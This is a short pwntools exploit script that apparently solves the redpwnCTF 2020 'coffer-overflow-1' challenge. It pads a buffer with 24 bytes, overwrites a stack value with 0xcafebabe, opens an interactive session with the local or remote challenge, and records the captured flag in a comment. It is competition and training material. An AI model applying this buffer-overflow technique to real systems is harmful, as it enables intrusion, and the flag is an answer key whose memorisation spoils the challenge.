from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./coffer-overflow-1')
	raw_input('debug')
else:
	host, port = '2020.redpwnc.tf', 31255
	r = remote(host, port)

a = 0xcafebabe
buf = 'a'*24 + p32(a)
r.sendline(buf)

r.interactive()
r.close()

# flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}